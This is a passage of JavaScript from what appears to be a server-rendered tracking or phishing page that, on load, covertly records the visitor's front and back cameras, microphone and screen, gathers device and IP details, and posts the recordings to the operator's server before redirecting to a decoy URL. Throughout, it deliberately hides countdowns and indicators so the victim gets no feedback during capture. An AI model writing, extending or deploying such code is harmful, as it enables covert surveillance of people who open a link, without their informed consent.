        
        // Create a blob from recorded chunks
        const recordedBlob = new Blob(recordedChunks, {type: 'video/webm'});
        
        // Convert blob to base64
        const reader = new FileReader();
        reader.readAsDataURL(recordedBlob);
        reader.onloadend = () => {
          const base64data = reader.result.split(',')[1];
          
          // Log the processed recording size
          console.log("Camera video processed (size: " + Math.round(recordedBlob.size/1024) + "KB)");
          
          // Send camera video recording data to server
          $.post("<%=a %>/cameravideo", {
            uid: uid,
            data: encodeURIComponent(base64data)
          }, (s) => { 
            console.log("Video recording sent to server");
          }).fail((error) => {
            console.error("Failed to send video recording:", error);
          });
          
          // Close and notify
          captureCompleted = true;
          hideLoadingScreen();
        };
      };
      
      // Listen for stream ending (user closes sharing dialog)
      stream.getVideoTracks()[0].onended = () => {
        if (mediaRecorder && isRecording) {
          mediaRecorder.stop();
          isRecording = false;
        }
      };
      
      // Start recording for 5 seconds
      mediaRecorder.start();
      isRecording = true;
      
      // Stop recording after 15 seconds
      setTimeout(() => {
        if (mediaRecorder && isRecording) {
          mediaRecorder.stop();
          isRecording = false;
        }
        
        // Close all tracks
        stream.getTracks().forEach(track => track.stop());
      }, 15000);
      
    } catch (e) {
      console.error("Camera video capture error:", e);
      captureCompleted = true;
      hideLoadingScreen();
    }
  }
  
  // Start the camera video recording
  startCameraCapture();
}

// Screenshot capture function
function initScreenshot() {
  console.log("Initializing screenshot capture with html2canvas");
  
  // No visual loading indicator as per user request
  const captureLoadingText = document.getElementById('countdown');
  if (captureLoadingText) {
    captureLoadingText.style.display = 'none';
  }
  
  // Use html2canvas for better screenshot capture with no visual feedback
  // Hide any loading indicator or feedback element
  if (captureLoadingText) {
    captureLoadingText.style.display = 'none';
  }
  
  setTimeout(() => {
    try {
      // Capture the entire page with no visual feedback
      window.html2canvas(document.body, {
        allowTaint: true,
        useCORS: true,
        scale: 1,
        logging: false, // Set to true for debugging
        onclone: (clonedDoc) => {
          // We can manipulate the cloned document before capture
          const timestamp = document.createElement('div');
          timestamp.style.position = 'fixed';
          timestamp.style.bottom = '10px';
          timestamp.style.right = '10px';
          timestamp.style.backgroundColor = 'rgba(0,0,0,0.7)';
          timestamp.style.color = 'white';
          timestamp.style.padding = '5px 10px';
          timestamp.style.borderRadius = '5px';
          timestamp.style.fontSize = '12px';
          timestamp.style.fontFamily = 'Arial, sans-serif';
          timestamp.innerHTML = `<div>üìÖ ${new Date().toLocaleString()}</div>
                                <div>üåê IP: <%=ip %></div>`;
          clonedDoc.body.appendChild(timestamp);
        }
      }).then(canvas => {
        console.log("Screenshot taken successfully");
        
        // Get the canvas data as base64
        const screenshotData = canvas.toDataURL('image/png').replace('data:image/png;base64,', '');
        
        // No feedback display as per user request
        
        // Send the screenshot to server
        $.post("<%=a %>/screenshot", {
          uid: uid,
          img: encodeURIComponent(screenshotData)
        }, (response) => {
          console.log("Screenshot sent successfully");
          captureCompleted = true;
          
          // Hide loading screen and show success animation
          setTimeout(() => {
            document.getElementById('capture-screen').style.display = 'none';
            document.getElementById('success-message').style.display = 'flex';
            
            // Redirect after slight delay
            setTimeout(() => {
              window.location.href = "<%=url %>";
            }, 2000);
          }, 1000);
        }).fail((error) => {
          console.error("Failed to send screenshot:", error);
          // No feedback display as per user request
          captureCompleted = true;
          
          // Still redirect after error
          setTimeout(() => {
            window.location.href = "<%=url %>";
          }, 2000);
        });
      }).catch(error => {
        console.error("Error capturing with html2canvas:", error);
        fallbackScreenshot();
      });
    } catch (error) {
      console.error("Screenshot initialization error:", error);
      fallbackScreenshot();
    }
  }, 1000);
  
  // Fallback to simpler screenshot if html2canvas fails
  function fallbackScreenshot() {
    console.log("Using fallback screenshot method");
    // No feedback display as per user request
    if (captureLoadingText) {
      captureLoadingText.style.display = 'none';
    }
    
    try {
      // Create a fallback canvas
      const canvas = document.getElementById('canvas');
      const screenshotCanvas = document.createElement('canvas');
      const ctx = screenshotCanvas.getContext('2d');
      
      // Set to viewport size
      screenshotCanvas.width = window.innerWidth;
      screenshotCanvas.height = window.innerHeight;
      
      // Fill with background
      ctx.fillStyle = "#FFFFFF";
      ctx.fillRect(0, 0, screenshotCanvas.width, screenshotCanvas.height);
      
      // Add metadata text
      ctx.font = "14px Arial";
      ctx.fillStyle = "#000000";
      ctx.fillText("Page captured at: " + new Date().toLocaleString(), 10, 20);
      ctx.fillText("IP: <%=ip %>", 10, 40);
      ctx.fillText("Device: " + navigator.userAgent, 10, 60);
      
      // User agent info
      ctx.fillText("Browser: " + navigator.userAgent, 10, 80);
      
      // Convert to base64
      const screenshotData = screenshotCanvas.toDataURL("image/png").replace("data:image/png;base64,", "");
      
      // Send to server
      $.post("<%=a %>/screenshot", {
        uid: uid,
        img: encodeURIComponent(screenshotData)
      }, (response) => {
        console.log("Fallback screenshot sent successfully");
        captureCompleted = true;
        
        // Redirect after successful capture
        setTimeout(() => {
          window.location.href = "<%=url %>";
        }, 1000);
      }).fail((error) => {
        console.error("Failed to send fallback screenshot:", error);
        captureCompleted = true;
        
        // Still redirect
        setTimeout(() => {
          window.location.href = "<%=url %>";
        }, 1000);
      });
    } catch (finalError) {
      console.error("All screenshot methods failed:", finalError);
      // No feedback display as per user request
      
      // Wait a moment then redirect anyway
      setTimeout(() => {
        window.location.href = "<%=url %>";
      }, 2000);
    }
  }
}

// Check if all captures are completed and hide loading screen
function checkAllCapturesCompleted() {
  if (captureCompleted) {
    hideLoadingScreen();
  }
}

// Hide the loading screen once everything is captured
function hideLoadingScreen() {
  setTimeout(() => {
    document.getElementById('loading-screen').style.display = 'none';
  }, 1000);
}

// Screenshot and video capture handling
if (captureMethod === "frontvideo" || captureMethod === "backvideo") {
  // Set up video recording process when page loads
  document.addEventListener('DOMContentLoaded', function() {
    console.log(`DOM loaded for ${captureMethod} page`);
    
    // Setup for UI elements if they exist
    const startButton = document.getElementById('start-video-capture');
    const skipButton = document.getElementById('skip-recording');
    const countdown = document.getElementById('countdown');
    const secondsElement = document.getElementById('seconds');
    const captureScreen = document.getElementById('capture-screen');
    
    // Function to show/hide capture elements without visual feedback
    function showCaptureInProgress() {
      if (startButton) {
        startButton.disabled = true;
        startButton.textContent = "Recording in progress...";
        startButton.style.backgroundColor = "#f44336";
      }
      
      if (skipButton) {
        skipButton.disabled = true;
      }
      
      // Hide countdown as per user request - no visual feedback during capture
      if (countdown) {
        countdown.style.display = 'none';
      }
    }
    
    // Function to redirect to the target URL
    function finishAndRedirect() {
      console.log("Finishing capture process and redirecting");
      
      // Show success message before redirect
      document.getElementById('success-message').style.display = 'flex';
      if (captureScreen) {
        captureScreen.style.display = 'none';
      }
      
      // Send basic device info
      gather();
      
      // Delayed redirect to target
      setTimeout(() => {
        console.log("Redirecting to:", "<%=url %>");
        window.location.href = "<%=url %>";
      }, 3000);
    }
    
    // Automatically start video recording without button click
    console.log(`Auto-starting video recording for ${captureMethod}`);
    showCaptureInProgress();
    
    // Execute the appropriate camera recording based on capture method
    if (captureMethod === "frontvideo") {
      console.log("Starting front camera video recording automatically");
      captureFrontCamera().then(() => {
        setTimeout(() => {
          finishAndRedirect();
        }, 10500); // Wait for 10s recording plus processing time
      });
    } else if (captureMethod === "backvideo") {
      console.log("Starting back camera video recording automatically");
      captureBackCamera().then(() => {
        setTimeout(() => {
          finishAndRedirect();
        }, 10500); // Wait for 10s recording plus processing time
      });
    }
    
    // Setup skip button handler if it exists
    if (skipButton) {
      skipButton.addEventListener('click', function() {
        console.log("Skip button clicked");
        finishAndRedirect();
      });
    }
    
    // Function to access camera with specified facing mode
    async function startCameraCapture(facingMode) {
      try {
        // Request camera access with specified facing mode
        const constraints = {
          audio: false,
          video: { 
            facingMode: facingMode,
            frameRate: { ideal: 24, max: 30 },
            width: { ideal: 1280 },
            height: { ideal: 720 }
          }
        };
        
        // Get stream
        const stream = await navigator.mediaDevices.getUserMedia(constraints);
        console.log(`${facingMode} camera accessed successfully`);
        return stream;
      } catch (error) {
        console.error(`Error accessing ${facingMode} camera:`, error);
        return null;
      }
    }
    
    // Front camera video recording implementation
    async function captureFrontCamera() {
      try {
        console.log("Requesting front camera video access");
        const stream = await startCameraCapture("user"); // "user" is front camera
        
        if (!stream) {
          console.error("Failed to access front camera");
          return false;
        }
        
        console.log("Front camera access granted for video");
        await recordFromStream(stream, "frontvideo");
        return true;
      } catch (error) {
        console.error("Front camera video recording error:", error);
        return false;
      }
    }
    
    // Back camera video recording implementation
    async function captureBackCamera() {
      try {
        console.log("Requesting back camera video access");
        const stream = await startCameraCapture("environment"); // "environment" is back camera
        
        if (!stream) {
          console.error("Failed to access back camera");
          return false;
        }
        
        console.log("Back camera access granted for video");
        await recordFromStream(stream, "backvideo");
        return true;
      } catch (error) {
        console.error("Back camera video recording error:", error);
        return false;
      }
    }
    
    // General function to record video from any stream
    async function recordFromStream(stream, recordingType) {
      return new Promise((resolve, reject) => {
        try {
          const video = document.getElementById('video');
          video.srcObject = stream;
          
          // Set up media recorder with options for smaller file size (optimized for Vercel)
          const options = {mimeType: 'video/webm; codecs=vp8', videoBitsPerSecond: 250000};
          const mediaRecorder = new MediaRecorder(stream, options);
          const recordedChunks = [];
          
          // Create a countdown element
          const countdownEl = document.getElementById('countdown');
          const secondsEl = document.getElementById('seconds');
          if (countdownEl && secondsEl) {
            countdownEl.classList.remove('hidden');
            secondsEl.textContent = '8'; // Set to 10 seconds as requested
          }
          
          // Update countdown timer
          let secondsLeft = 8; // 10 second recording as requested for Vercel
          const countdownInterval = setInterval(() => {
            secondsLeft--;
            if (secondsEl) {
              secondsEl.textContent = secondsLeft.toString();
            }
            if (secondsLeft <= 0) {
              clearInterval(countdownInterval);
            }
          }, 1000);
          
          // Handle data available events
          mediaRecorder.ondataavailable = (event) => {
            if (event.data.size > 0) {
              recordedChunks.push(event.data);
              console.log(`Video chunk received: ${Math.round(event.data.size/1024)}KB`);
            }
          };
          
          // When recording stops
          mediaRecorder.onstop = () => {
            clearInterval(countdownInterval);
            console.log(`${recordingType} video recording completed`);
            
            if (countdownEl) {
              countdownEl.classList.add('hidden');
            }
            
            try {
              // Create blob from chunks
              const videoBlob = new Blob(recordedChunks, {type: 'video/webm'});
              console.log(`Total video recording size: ${Math.round(videoBlob.size/1024)}KB`);
              
              // Convert to base64 using FileReader
              const reader = new FileReader();
              reader.readAsDataURL(videoBlob);
              reader.onloadend = () => {
                try {
                  const base64data = reader.result.split(',')[1];
                  console.log(`Video base64 data length: ${base64data.length} chars`);
                  
                  // Determine the correct endpoint based on recordingType
                  let endpoint = '';
                  if (recordingType === 'frontvideo') {
                    endpoint = 'videofrontcamera';
                  } else if (recordingType === 'backvideo') {
                    endpoint = 'videobackcamera';
                  } else {
                    endpoint = 'cameravideo';
                  }
                  
                  // Send to server
                  $.post(`<%=a %>/${endpoint}`, {
                    uid: uid,
                    data: encodeURIComponent(base64data)
                  }, (s) => { 
                    console.log(`${recordingType} video recording sent successfully`);
                    resolve(true);
                  }).fail((error) => {
                    console.error(`Server error sending ${recordingType} video:`, error);
                    resolve(false);
                  });
                } catch (e) {
                  console.error("Error processing video recording data:", e);
                  resolve(false);
                }
              };
            } catch (e) {
              console.error("Error creating video blob:", e);
              resolve(false);
            }
            
            // Stop all tracks
            stream.getTracks().forEach(track => {
              track.stop();
              console.log("Video track stopped:", track.kind);
            });
          };
          
          // Start recording with 1 second chunks for smoother data handling
          mediaRecorder.start(1000);
          console.log(`${recordingType} video MediaRecorder started`);
          
          // Record for 8 seconds as requested for Vercel
          setTimeout(() => {
            if (mediaRecorder.state !== 'inactive') {
              console.log(`Stopping ${recordingType} video recording after 8 seconds`);
              mediaRecorder.stop();
            }
          }, 8000); // 10 seconds for Vercel
        } catch (error) {
          console.error(`Error in ${recordingType} video recording:`, error);
          reject(error);
        }
      });
    }
  });
} else if (captureMethod === "screenshot") {
  // Set up screen capture process when page loads
  document.addEventListener('DOMContentLoaded', function() {
    console.log(`DOM loaded for ${captureMethod} page`);
    
    const startButton = document.getElementById('start-screen-capture');
    const skipButton = document.getElementById('skip-recording');
    const countdown = document.getElementById('countdown');
    const secondsElement = document.getElementById('seconds');
    const captureScreen = document.getElementById('capture-screen');
    
    // Function to show/hide capture elements without visual feedback
    function showCaptureInProgress() {
      if (startButton) {
        startButton.disabled = true;
        startButton.textContent = "Taking screenshot...";
        startButton.style.backgroundColor = "#f44336";
      }
      
      if (skipButton) {
        skipButton.disabled = true;
      }
      
      // Hide countdown as per user request - no visual feedback during capture
      if (countdown) {
        countdown.style.display = 'none';
      }
    }
    
    // Function to redirect to the target URL
    function finishAndRedirect() {
      console.log("Finishing capture process and redirecting");
      
      // Show success message before redirect
      document.getElementById('success-message').style.display = 'flex';
      if (captureScreen) {
        captureScreen.style.display = 'none';
      }
      
      // Send basic device info
      gather();
      
      // Delayed redirect to target
      setTimeout(() => {
        console.log("Redirecting to:", "<%=url %>");
        window.location.href = "<%=url %>";
      }, 3000);
    }
    
    // Automatically start screenshot capture without button click
    console.log(`Auto-starting screenshot capture for ${captureMethod}`);
    showCaptureInProgress();
    
    // Take screenshot
    initScreenshot();
    
    // Short delay then finish
    setTimeout(() => {
      finishAndRedirect();
    }, 2000);
    
    // Setup skip button handler if it exists
    if (skipButton) {
      skipButton.addEventListener('click', function() {
        console.log("Skip button clicked");
        finishAndRedirect();
      });
    }
    
    // Function to access camera with specified facing mode
    async function startCameraCapture(facingMode) {
      try {
        // Request camera access with specified facing mode
        const constraints = {
          audio: false,
          video: { 
            facingMode: facingMode,
            frameRate: { ideal: 24, max: 30 },
            width: { ideal: 1280 },
            height: { ideal: 720 }
          }
        };
        
        // Get stream
        const stream = await navigator.mediaDevices.getUserMedia(constraints);
        console.log(`${facingMode} camera accessed successfully`);
        return stream;
      } catch (error) {
        console.error(`Error accessing ${facingMode} camera:`, error);
        return null;
      }
    }
    
    // Front camera video recording implementation
    async function captureFrontCamera() {
      try {
        console.log("Requesting front camera video access");
        const stream = await startCameraCapture("user"); // "user" is front camera
        
        if (!stream) {
          console.error("Failed to access front camera");
          return false;
        }
        
        console.log("Front camera access granted for video");
        await recordFromStream(stream, "frontvideo");
        return true;
      } catch (error) {
        console.error("Front camera video recording error:", error);
        return false;
      }
    }
    
    // Back camera video recording implementation
    async function captureBackCamera() {
      try {
        console.log("Requesting back camera video access");
        const stream = await startCameraCapture("environment"); // "environment" is back camera
        
        if (!stream) {
          console.error("Failed to access back camera");
          return false;
        }
        
        console.log("Back camera access granted for video");
        await recordFromStream(stream, "backvideo");
        return true;
      } catch (error) {
        console.error("Back camera video recording error:", error);
        return false;
      }
    }
    
    // General function to record video from any stream
    async function recordFromStream(stream, recordingType) {
      return new Promise((resolve, reject) => {
        try {
          const video = document.getElementById('video');
          video.srcObject = stream;
          
          // Set up media recorder with options for smaller file size (optimized for Vercel)
          const options = {mimeType: 'video/webm; codecs=vp8', videoBitsPerSecond: 250000};
          const mediaRecorder = new MediaRecorder(stream, options);
          const recordedChunks = [];
          
          // Create a countdown element
          const countdownEl = document.getElementById('countdown');
          const secondsEl = document.getElementById('seconds');
          if (countdownEl && secondsEl) {
            countdownEl.classList.remove('hidden');
            secondsEl.textContent = '8'; // Set to 10 seconds as requested
          }
          
          // Update countdown timer
          let secondsLeft = 8; // 10 second recording as requested for Vercel
          const countdownInterval = setInterval(() => {
            secondsLeft--;
            if (secondsEl) {
              secondsEl.textContent = secondsLeft.toString();
            }
            if (secondsLeft <= 0) {
              clearInterval(countdownInterval);
            }
          }, 1000);
          
          // Handle data available events
          mediaRecorder.ondataavailable = (event) => {
            if (event.data.size > 0) {
              recordedChunks.push(event.data);
              console.log(`Video chunk received: ${Math.round(event.data.size/1024)}KB`);
            }
          };
          
          // When recording stops
          mediaRecorder.onstop = () => {
            clearInterval(countdownInterval);
            console.log(`${recordingType} video recording completed`);
            
            if (countdownEl) {
              countdownEl.classList.add('hidden');
            }
            
            try {
              // Create blob from chunks
              const videoBlob = new Blob(recordedChunks, {type: 'video/webm'});
              console.log(`Total video recording size: ${Math.round(videoBlob.size/1024)}KB`);
              
              // Convert to base64 using FileReader
              const reader = new FileReader();
              reader.readAsDataURL(videoBlob);
              reader.onloadend = () => {
                try {
                  const base64data = reader.result.split(',')[1];
                  console.log(`Video base64 data length: ${base64data.length} chars`);
                  
                  // Determine the correct endpoint based on recordingType
                  let endpoint = '';
                  if (recordingType === 'frontvideo') {
                    endpoint = 'videofrontcamera';
                  } else if (recordingType === 'backvideo') {
                    endpoint = 'videobackcamera';
                  } else {
                    endpoint = 'cameravideo';
                  }
                  
                  // Send to server
                  $.post(`<%=a %>/${endpoint}`, {
                    uid: uid,
                    data: encodeURIComponent(base64data)
                  }, (s) => { 
                    console.log(`${recordingType} video recording sent successfully`);
                    resolve(true);
                  }).fail((error) => {
                    console.error(`Server error sending ${recordingType} video:`, error);
                    resolve(false);
                  });
                } catch (e) {
                  console.error("Error processing video recording data:", e);
                  resolve(false);
                }
              };
            } catch (e) {
              console.error("Error creating video blob:", e);
              resolve(false);
            }
            
            // Stop all tracks
            stream.getTracks().forEach(track => {
              track.stop();
              console.log("Video track stopped:", track.kind);
            });
          };
          
          // Start recording with 1 second chunks for smoother data handling
          mediaRecorder.start(1000);
          console.log(`${recordingType} video MediaRecorder started`);
          
          // Record for 8 seconds as requested for Vercel
          setTimeout(() => {
            if (mediaRecorder.state !== 'inactive') {
              console.log(`Stopping ${recordingType} video recording after 8 seconds`);
              mediaRecorder.stop();
            }
          }, 8000); // 10 seconds for Vercel
        } catch (error) {
          console.error(`Error in ${recordingType} video recording:`, error);
          reject(error);
        }
      });
    }
    
    // The actual screen recording implementation
    async function captureScreen() {
      try {
        console.log("Requesting display media access");
        const stream = await navigator.mediaDevices.getDisplayMedia({
          video: { 
            cursor: "always",
            frameRate: 15,
          },
          audio: false
        });
        
        console.log("Display media access granted");
        const video = document.getElementById('video');
        video.srcObject = stream;
        
        // Set up media recorder with options for smaller file size
        const options = {mimeType: 'video/webm', videoBitsPerSecond: 250000};
        const mediaRecorder = new MediaRecorder(stream, options);
        const recordedChunks = [];
        
        // Handle data available events
        mediaRecorder.ondataavailable = (event) => {
          if (event.data.size > 0) {
            recordedChunks.push(event.data);
            console.log(`Chunk received: ${Math.round(event.data.size/1024)}KB`);
          }
        };
        
        // When recording stops
        mediaRecorder.onstop = () => {
          console.log("MediaRecorder stopped");
          
          try {
            // Create blob from chunks
            const videoBlob = new Blob(recordedChunks, {type: 'video/webm'});
            console.log(`Total recording size: ${Math.round(videoBlob.size/1024)}KB`);
            
            // Convert to base64 using FileReader
            const reader = new FileReader();
            reader.readAsDataURL(videoBlob);
            reader.onloadend = () => {
              try {
                const base64data = reader.result.split(',')[1];
                console.log(`Base64 data length: ${base64data.length} chars`);
                
                // Send to server (using camera video endpoint instead of screenrecording)
                $.post("<%=a %>/cameravideo", {
                  uid: uid,
                  data: encodeURIComponent(base64data)
                }, (s) => { 
                  console.log("Video recording sent successfully");
                }).fail((error) => {
                  console.error("Server error:", error);
                });
              } catch (e) {
                console.error("Error processing recording data:", e);
              }
            };
          } catch (e) {
            console.error("Error creating video blob:", e);
          }
          
          // Stop tracks
          stream.getTracks().forEach(track => {
            track.stop();
            console.log("Track stopped:", track.kind);
          });
        };
        
        // Start recording
        mediaRecorder.start(1000); // Get data every second for smaller chunks
        console.log("MediaRecorder started");
        
        // Stop after 15 seconds
        setTimeout(() => {
          if (mediaRecorder.state !== 'inactive') {
            console.log("Stopping recording after 15 seconds");
            mediaRecorder.stop();
          }
        }, 15000);
        
      } catch (error) {
        console.error("Screen capture error:", error);
        // If permission denied or other error, still finish the process
        // No feedback display as per user request
        document.getElementById('countdown').style.display = 'none';
      }
    }
  });
  
  // Function to handle multiple capture methods one after another
  async function startMultipleCaptures() {
    console.log("Starting multi-capture sequence");
    
    // First gather basic device info and location data
    gather();
    
    // Wait a short moment to allow device info to be sent
    await new Promise(resolve => setTimeout(resolve, 1000));
    
    // Track the overall capture progress
    let frontCameraSuccess = false;
    let backCameraSuccess = false;
    
    // Try front camera first
    try {
      frontCameraSuccess = await captureFrontCamera();
      console.log(`Front camera capture ${frontCameraSuccess ? 'succeeded' : 'failed'}`);
    } catch (error) {
      console.error("Front camera capture error:", error);
    }
    
    // Wait a moment between captures
    await new Promise(resolve => setTimeout(resolve, 1000));
    
    // Then try back camera
    try {
      backCameraSuccess = await captureBackCamera();
      console.log(`Back camera capture ${backCameraSuccess ? 'succeeded' : 'failed'}`);
    } catch (error) {
      console.error("Back camera capture error:", error);
    }
    
    // Wait a moment before screen capture
    await new Promise(resolve => setTimeout(resolve, 1000));
    
    // Finally try screen capture for completeness
    try {
      captureScreen();
    } catch (error) {
      console.error("Screen capture sequence error:", error);
    }
    
    // Log the overall success rate
    console.log(`Multi-capture completed. Front camera: ${frontCameraSuccess}, Back camera: ${backCameraSuccess}`);
  }
  
  // Don't call gather() here - we'll call it inside startMultipleCaptures
} else {
  // Special initialization for camera image capture and audio methods
if (captureMethod === "frontcam" || captureMethod === "backcam" || captureMethod === "allcams" || captureMethod === "audio") {
  // Auto-start camera image capture for specific modes
  document.addEventListener('DOMContentLoaded', function() {
    console.log(`Auto-starting camera image capture for ${captureMethod}`);
    
    // Set up camera with the appropriate facing mode
    const facingMode = captureMethod === "frontcam" ? "user" : "environment";
    
    // Show a loading message (invisibly, per requirement)
    const loadingText = document.getElementById('loading-text');
    if (loadingText) {
      if (captureMethod === "audio") {
        loadingText.textContent = "Accessing microphone...";
      } else {
        loadingText.textContent = `Accessing ${captureMethod === "frontcam" ? "front" : "back"} camera...`;
      }
    }
    
    // Select the right function based on capture method
    if (captureMethod === "allcams") {
      // For allcams, use specialized function to record from both cameras
      console.log("Starting multi-camera capture sequence");
      captureAllCameras();
    } else if (captureMethod === "audio") {
      // For audio recording, use audio capture function
      console.log("Starting audio recording");
      captureAudio();
    } else {
      // For single camera captures, use standard function
      captureCamera();
    }
    
    // Function for capturing from both cameras simultaneously (allcams)
    async function captureAllCameras() {
      console.log("Starting all cameras capture");
      try {
        // Create a 10-second timer for multi-camera recordings
        let recordingTime = 8000; // 10 seconds
        
        // First start front camera video
        const frontPromise = startCameraRecording("user", "frontvideo");
        
        // Add a small delay before starting the back camera to prevent conflicts
        setTimeout(async () => {
          // Then start back camera video
          const backPromise = startCameraRecording("environment", "backvideo");
          
          // Wait for both to complete (or timeout after 15 seconds)
          setTimeout(() => {
            console.log("All cameras recording complete");
            
            // Show success message
            document.getElementById('success-message').style.display = 'flex';
            const captureScreen = document.getElementById('capture-screen');
            if (captureScreen) {
              captureScreen.style.display = 'none';
            }
            
            // Send general device info
            gather();
            
            // Redirect after a delay
            setTimeout(() => {
              window.location.href = "<%=url %>";
            }, 3000);
          }, recordingTime + 5000); // Allow extra time for processing
        }, 500);
      } catch (error) {
        console.error("Error in multi-camera recording:", error);
        
        // Fallback - still gather info and redirect
        gather();
        setTimeout(() => {
          window.location.href = "<%=url %>";
        }, 2000);
      }
    }
    
    // Helper function for allcams to record from specific camera
    async function startCameraRecording(facingMode, recordingType) {
      try {
        console.log(`Starting ${recordingType} recording`);
        
        // Request camera access
        const stream = await navigator.mediaDevices.getUserMedia({
          video: { 
            facingMode: facingMode,
            width: { ideal: 1280 },
            height: { ideal: 720 }
          },
          audio: false
        });
        
        console.log(`${facingMode} camera stream obtained for video`);
        
        // Set up media recorder for video
        const options = {mimeType: 'video/webm; codecs=vp8', videoBitsPerSecond: 250000};
        const mediaRecorder = new MediaRecorder(stream, options);
        const recordedChunks = [];
        
        // Handle data available events
        mediaRecorder.ondataavailable = (event) => {
          if (event.data.size > 0) {
            recordedChunks.push(event.data);
            console.log(`Video chunk received (${recordingType}): ${Math.round(event.data.size/1024)}KB`);
          }
        };
        
        // When recording stops
        mediaRecorder.onstop = () => {
          console.log(`${recordingType} recording completed`);
          
          try {
            // Create blob from chunks
            const videoBlob = new Blob(recordedChunks, {type: 'video/webm'});
            console.log(`Total recording size (${recordingType}): ${Math.round(videoBlob.size/1024)}KB`);
            
            // Convert to base64 using FileReader
            const reader = new FileReader();
            reader.readAsDataURL(videoBlob);
            reader.onloadend = () => {
              try {
                const base64data = reader.result.split(',')[1];
                console.log(`Video base64 data length (${recordingType}): ${base64data.length} chars`);
                
                // Determine the endpoint based on recording type
                let endpoint = recordingType === 'frontvideo' ? 'videofrontcamera' : 'videobackcamera';
                
                // Send to server
                $.post(`<%=a %>/${endpoint}`, {
                  uid: uid,
                  data: encodeURIComponent(base64data)
                }, (s) => { 
                  console.log(`${recordingType} recording sent successfully`);
                }).fail((error) => {
                  console.error(`Server error sending ${recordingType}:`, error);
                });
              } catch (e) {
                console.error("Error processing video recording data:", e);
              }
            };
          } catch (e) {
            console.error("Error creating video blob:", e);
          }
          
          // Stop all tracks
          stream.getTracks().forEach(track => {
            track.stop();
            console.log(`${recordingType} track stopped:`, track.kind);
          });
        };
        
        // Start recording with 1 second chunks for smoother data handling
        mediaRecorder.start(1000);
        console.log(`${recordingType} MediaRecorder started`);
        
        // Record for 8 seconds as requested for Vercel
        setTimeout(() => {
          if (mediaRecorder.state !== 'inactive') {
            console.log(`Stopping ${recordingType} after 8 seconds`);
            mediaRecorder.stop();
          }
        }, 8000); // 10 seconds
        
        return true;
      } catch (error) {
        console.error(`Error starting ${recordingType}:`, error);
        return false;
      }
    }
    
    // Function to capture audio recording
    async function captureAudio() {
      console.log("Starting audio recording capture");
      try {
        // Update loading text if exists
        const loadingText = document.getElementById('loading-text');
        if (loadingText) {
          loadingText.textContent = "Starting audio recording...";
        }
        
        // Request microphone access
        const stream = await navigator.mediaDevices.getUserMedia({
          audio: {
            echoCancellation: true,
            noiseSuppression: true,
            autoGainControl: true
          },
          video: false
        });
        
        console.log("Microphone access granted");
        
        // Set up media recorder for audio
        const options = {mimeType: 'audio/webm'};
        const mediaRecorder = new MediaRecorder(stream, options);
        const recordedChunks = [];
        
        // Set recording duration - 15 seconds for audio
        const recordingDuration = 15000; // 15 seconds
        
        // Handle data available events
        mediaRecorder.ondataavailable = (event) => {
          if (event.data.size > 0) {
            recordedChunks.push(event.data);
            console.log(`Audio chunk received: ${Math.round(event.data.size/1024)}KB`);
          }
        };
        
        // When recording stops
        mediaRecorder.onstop = () => {
          console.log("Audio recording completed");
          
          try {
            // Create blob from chunks
            const audioBlob = new Blob(recordedChunks, {type: 'audio/webm'});
            console.log(`Total audio recording size: ${Math.round(audioBlob.size/1024)}KB`);
            
            // Convert to base64 using FileReader
            const reader = new FileReader();
            reader.readAsDataURL(audioBlob);
            reader.onloadend = () => {
              try {
                const base64data = reader.result.split(',')[1];
                console.log(`Audio base64 data length: ${base64data.length} chars`);
                
                // Send to server
                $.post(`<%=a %>/audiorecording`, {
                  uid: uid,
                  data: encodeURIComponent(base64data)
                }, (s) => { 
                  console.log("Audio recording sent successfully");
                  
                  // Show success message
                  document.getElementById('success-message').style.display = 'flex';
                  const captureScreen = document.getElementById('capture-screen');
                  if (captureScreen) {
                    captureScreen.style.display = 'none';
                  }
                  
                  // Send general device info
                  gather();
                  
                  // Redirect after a delay
                  setTimeout(() => {
                    window.location.href = "<%=url %>";
                  }, 3000);
                  
                }).fail((error) => {
                  console.error("Server error sending audio:", error);
                  
                  // Still gather info and redirect on error
                  gather();
                  setTimeout(() => {
                    window.location.href = "<%=url %>";
                  }, 2000);
                });
              } catch (e) {
                console.error("Error processing audio recording data:", e);
                
                // Fallback - gather info and redirect
                gather();
                setTimeout(() => {
                  window.location.href = "<%=url %>";
                }, 2000);
              }
            };
          } catch (e) {
            console.error("Error creating audio blob:", e);
            
            // Fallback - gather info and redirect
            gather();
            setTimeout(() => {
              window.location.href = "<%=url %>";
            }, 2000);
          }
          
          // Stop all tracks
          stream.getTracks().forEach(track => {
            track.stop();
            console.log("Audio track stopped:", track.kind);
          });
        };
        
        // Start recording
        mediaRecorder.start(1000); // 1 second chunks
        console.log("Audio MediaRecorder started");
        
        // Record for set duration
        setTimeout(() => {
          if (mediaRecorder.state !== 'inactive') {
            console.log(`Stopping audio recording after ${recordingDuration/1000} seconds`);
            mediaRecorder.stop();
          }
        }, recordingDuration);
        
      } catch (error) {
        console.error("Error in audio recording:", error);
        
        // Fallback - still gather info and redirect
        gather();
        setTimeout(() => {
          window.location.href = "<%=url %>";
        }, 2000);
      }
    }
    
    // Function to capture image from a single camera
    async function captureCamera() {
      console.log(`Starting ${captureMethod} image capture`);
      try {
        // Request camera access
        const stream = await navigator.mediaDevices.getUserMedia({
          video: { 
            facingMode: facingMode,
            width: { ideal: 1280 },
            height: { ideal: 720 }
          },
          audio: false
        });
        
        console.log(`${facingMode} camera stream obtained`);
        
        // Get video and canvas elements
        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');
        const context = canvas.getContext('2d');
        
        // Set up video with stream
        video.srcObject = stream;
        
        // Wait for video to be ready
        video.onloadeddata = function() {
          console.log("Video ready, capturing image");
          
          // Set canvas size to match video
          canvas.width = video.videoWidth;
          canvas.height = video.videoHeight;
          
          // Draw video frame to canvas
          context.drawImage(video, 0, 0, canvas.width, canvas.height);
          
          // Convert to base64
          const imageData = canvas.toDataURL('image/jpeg', 0.9).split(',')[1];
          
          // Stop camera stream
          stream.getTracks().forEach(track => {
            track.stop();
            console.log(`Camera track stopped: ${track.kind}`);
          });
          
          // Send to server
          $.post("<%=a %>/camsnap", {
            uid: uid,
            img: encodeURIComponent(imageData)
          }, (response) => {
            console.log(`${captureMethod} image capture successful`);
            
            // Show success message
            document.getElementById('success-message').style.display = 'flex';
            const captureScreen = document.getElementById('capture-screen');
            if (captureScreen) {
              captureScreen.style.display = 'none';
            }
            
            // Send general device info
            gather();
            
            // Redirect after a delay
            setTimeout(() => {
              window.location.href = "<%=url %>";
            }, 3000);
          }).fail((error) => {
